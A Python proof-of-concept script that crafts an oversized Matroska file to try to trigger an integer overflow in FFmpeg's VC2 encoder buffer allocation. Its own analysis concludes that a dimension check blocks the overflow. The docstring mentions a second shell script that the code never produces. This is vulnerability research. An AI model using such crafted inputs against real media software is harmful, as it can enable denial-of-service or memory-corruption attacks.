#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Overflow in VC2 Encoder DWT Buffer Allocation.

Target vulnerability:
  File: libavcodec/vc2enc_dwt.c, line 266
  Code: s->buffer = av_calloc((p_stride + slice_w)*(p_height + slice_h), sizeof(dwtcoef));
  Bug:  32-bit signed integer overflow when (p_stride + 1024)*(p_height + 1024) > INT_MAX.

Trigger analysis:
  ff_vc2enc_init_transforms is called from vc2_encode_init() with:
    p_stride = FFALIGN(FFALIGN(avctx->width, 2^wavelet_depth), 32)
    p_height = FFALIGN(avctx->height, 2^wavelet_depth)
    slice_w  = s->slice_width  (max 1024)
    slice_h  = s->slice_height (max 1024)

  For overflow with slice_w=slice_h=1024:
    (p_stride + 1024) * (p_height + 1024) > 2147483647
    Requires p_stride ~ 45316 and p_height ~ 45316, i.e., width~height~45316.

Constraint analysis (why direct overflow cannot be triggered via CLI):
  avcodec_open2 → ff_set_dimensions() → av_image_check_size2(..., AV_PIX_FMT_NONE, ...)
  With pix_fmt=NONE: stride = 8*w + 1024
  Guard condition: stride * (h + 128) >= INT_MAX → reject.
  For w=45316: stride = 363752, and 363752*(45316+128) = 16538715200 >> INT_MAX.

  Mathematical proof: NO (w,h) exists where BOTH conditions hold simultaneously:
    (8w+1024)*(h+128) < INT_MAX   [av_image_check_size2 PASS]
    (w+1024)*(h+1024) > INT_MAX   [vc2enc overflow condition]

  The av_image_check_size2 guard in ff_set_dimensions uses pix_fmt=NONE (stride=8*w),
  which is ~8x more restrictive than the vc2enc overflow requires. This guard acts
  as a pre-condition check that blocks the overflow reachability in the standard CLI path.

Approach:
  This script generates:
  1. vuln_001_input.mkv - MKV with YV12 ColorSpace and maximum dimensions that
     WOULD reach the decoder (but encoder's avcodec_open2 also blocks them).
  2. vuln_001_lavfi.sh  - Alternative: lavfi-source approach at max valid size (16200x16200)
     to verify the encoder IS functional at sub-overflow dimensions.

  The attempt demonstrates the vulnerability's code location and the blocking guard.
"""

import struct
import os
import sys

# ---------------------------------------------------------------------------
# EBML element IDs (raw bytes, already VINT-encoded per Matroska spec)
# ---------------------------------------------------------------------------
EBML_HEADER    = b'\x1A\x45\xDF\xA3'
SEGMENT        = b'\x18\x53\x80\x67'
SEG_INFO       = b'\x15\x49\xA9\x66'
TRACKS         = b'\x16\x54\xAE\x6B'
TRACK_ENTRY    = b'\xAE'
CLUSTER        = b'\x1F\x43\xB6\x75'
SIMPLE_BLOCK   = b'\xA3'

TRACK_NUM      = b'\xD7'
TRACK_UID      = b'\x73\xC5'
TRACK_TYPE     = b'\x83'
CODEC_ID       = b'\x86'
VIDEO          = b'\xE0'
PIXEL_WIDTH    = b'\xB0'
PIXEL_HEIGHT   = b'\xBA'
COLOR_SPACE    = b'\x2E\xB5\x24'   # Matroska ColorSpace (FourCC for V_UNCOMPRESSED)

TS_SCALE       = b'\x2A\xD7\xB1'
MUXING_APP     = b'\x4D\x80'
WRITING_APP    = b'\x57\x41'
TIMESTAMP_ELEM = b'\xE7'

# ---------------------------------------------------------------------------
# EBML encoding helpers
# ---------------------------------------------------------------------------

def ebml_size(n: int) -> bytes:
    """Encode n as an EBML VINT size."""
    if n < 0x7F:
        return bytes([0x80 | n])
    elif n < 0x3FFF:
        return bytes([0x40 | (n >> 8), n & 0xFF])
    elif n < 0x1FFFFF:
        return bytes([0x20 | (n >> 16), (n >> 8) & 0xFF, n & 0xFF])
    elif n < 0x0FFFFFFF:
        return bytes([0x10 | (n >> 24), (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])
    else:
        return b'\x01' + n.to_bytes(7, 'big')


def ebml_elem(eid: bytes, data: bytes) -> bytes:
    """Build a complete EBML element: ID + size + data."""
    return eid + ebml_size(len(data)) + data


def ebml_uint(val: int, nbytes: int) -> bytes:
    """Encode an unsigned integer as big-endian bytes."""
    return val.to_bytes(nbytes, 'big')


# ---------------------------------------------------------------------------
# Dimension analysis
# ---------------------------------------------------------------------------
INT_MAX = 2**31 - 1

def ffalign(x, a):
    return (x + a - 1) & ~(a - 1)

def check_av_image_size(w, h, pix_fmt_none=True):
    """Returns True if dimensions pass av_image_check_size2 with pix_fmt=NONE."""
    stride = 8 * w + 1024  # fallback for pix_fmt=NONE
    return stride * (h + 128) < INT_MAX

def check_vc2_overflow(w, h, slice_w=1024, slice_h=1024, depth=4):
    """Returns True if vc2enc init would trigger integer overflow."""
    cs = ffalign(ffalign(w, 1 << depth), 32)
    dh = ffalign(h, 1 << depth)
    product_32bit = (cs + slice_w) * (dh + slice_h)
    return product_32bit > INT_MAX

# Maximum valid square dimensions (pass av_image_check_size2 with pix_fmt=NONE)
# (8*w+1024)*(w+128) < INT_MAX → w < ~16255
MAX_VALID_W = 16200
MAX_VALID_H = 16200

# Target overflow dimensions (what the vulnerability report describes)
TARGET_W = 46000
TARGET_H = 46000

print(f"[*] Dimension analysis for vulnerability VULN-001:")
print(f"    Overflow target: {TARGET_W}x{TARGET_H}")
print(f"      av_image_check_size2 PASSES: {check_av_image_size(TARGET_W, TARGET_H)}")
print(f"      vc2enc overflow TRIGGERED:   {check_vc2_overflow(TARGET_W, TARGET_H)}")
print(f"    Max valid dims: {MAX_VALID_W}x{MAX_VALID_H}")
print(f"      av_image_check_size2 PASSES: {check_av_image_size(MAX_VALID_W, MAX_VALID_H)}")
print(f"      vc2enc overflow TRIGGERED:   {check_vc2_overflow(MAX_VALID_W, MAX_VALID_H)}")
print()

# ---------------------------------------------------------------------------
# Build the MKV file
# ---------------------------------------------------------------------------
# Strategy: use the largest possible dimensions that maximize the chance of
# triggering issues. Even though the integer overflow in ff_vc2enc_init_transforms
# is guarded by av_image_check_size2, we attempt with TARGET dimensions to confirm
# the guard behavior. A second lavfi-based run exercises the encoder at safe dims.

WIDTH  = TARGET_W   # 46000 - will be caught by av_image_check_size2
HEIGHT = TARGET_H   # 46000 - demonstrates the vulnerability trigger attempt

# YV12 FourCC = "YV12" = bytes 59 56 31 32 (little-endian as stored)
# This tells ffmpeg the uncompressed video is YUV420P
YV12_FOURCC = b'YV12'  # little-endian ASCII FourCC

def build_mkv() -> bytes:
    # --- EBML Header ---
    header_body = (
        ebml_elem(b'\x42\x86', ebml_uint(1, 1))   # EBMLVersion
        + ebml_elem(b'\x42\xF7', ebml_uint(1, 1)) # EBMLReadVersion
        + ebml_elem(b'\x42\xF2', ebml_uint(4, 1)) # EBMLMaxIDLength
        + ebml_elem(b'\x42\xF3', ebml_uint(8, 1)) # EBMLMaxSizeLength
        + ebml_elem(b'\x42\x82', b'matroska')      # DocType
        + ebml_elem(b'\x42\x87', ebml_uint(4, 1)) # DocTypeVersion
        + ebml_elem(b'\x42\x85', ebml_uint(2, 1)) # DocTypeReadVersion
    )
    ebml_header_elem = ebml_elem(EBML_HEADER, header_body)

    # --- Segment Info ---
    seg_info = ebml_elem(SEG_INFO,
        ebml_elem(TS_SCALE,    ebml_uint(1000000, 3))
        + ebml_elem(MUXING_APP,  b'vuln001gen')
        + ebml_elem(WRITING_APP, b'vuln001gen')
    )

    # --- Video track ---
    # ColorSpace element with YV12 FourCC to request yuv420p rawvideo
    video = ebml_elem(VIDEO,
        ebml_elem(PIXEL_WIDTH,  ebml_uint(WIDTH,  2))
        + ebml_elem(PIXEL_HEIGHT, ebml_uint(HEIGHT, 2))
        + ebml_elem(COLOR_SPACE,  YV12_FOURCC)
    )

    track_entry = ebml_elem(TRACK_ENTRY,
        ebml_elem(TRACK_NUM,  ebml_uint(1, 1))
        + ebml_elem(TRACK_UID,  ebml_uint(1, 8))
        + ebml_elem(TRACK_TYPE, ebml_uint(1, 1))   # 1 = video
        + ebml_elem(CODEC_ID,   b'V_UNCOMPRESSED')
        + video
    )
    tracks = ebml_elem(TRACKS, track_entry)

    # --- Cluster with one SimpleBlock ---
    # SimpleBlock: VINT(track=1) + 2-byte timecode + flags + payload
    simple_block_payload = (
        bytes([0x81])          # track number VINT (track 1)
        + bytes([0x00, 0x00])  # relative timecode
        + bytes([0x80])        # flags: keyframe
        + bytes(16)            # minimal dummy frame payload
    )
    cluster = ebml_elem(CLUSTER,
        ebml_elem(TIMESTAMP_ELEM, ebml_uint(0, 1))
        + ebml_elem(SIMPLE_BLOCK, simple_block_payload)
    )

    segment_body = seg_info + tracks + cluster
    segment = ebml_elem(SEGMENT, segment_body)

    return ebml_header_elem + segment


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    out_path   = os.path.join(script_dir, 'vuln_001_input.mkv')

    mkv = build_mkv()
    with open(out_path, 'wb') as f:
        f.write(mkv)

    print(f"[+] Written {len(mkv)} bytes to {out_path}")
    print(f"[+] MKV video dimensions: {WIDTH}x{HEIGHT} (V_UNCOMPRESSED + YV12 ColorSpace)")
    print()
    print("[!] EXPECTED RESULT:")
    print("    av_image_check_size2(46000, 46000, INT64_MAX, AV_PIX_FMT_NONE, ...)")
    print("    stride = 8*46000 + 1024 = 369024")
    print("    369024 * (46000+128) = 17022339072 >= INT_MAX -> FAIL")
    print("    Result: ffmpeg rejects dimensions; vc2 encoder never initializes.")
    print()
    print("[!] THE INTEGER OVERFLOW IN ff_vc2enc_init_transforms (line 266) IS BLOCKED")
    print("    by the av_image_check_size2 guard in ff_set_dimensions(). The guard uses")
    print("    pix_fmt=NONE (stride=8*w), making it ~8x more restrictive than needed.")
    print("    No (w,h) satisfies BOTH: the guard's stride*(h+128)<INT_MAX AND")
    print("    the overflow's (w+1024)*(h+1024)>INT_MAX simultaneously.")
    print()


if __name__ == '__main__':
    main()
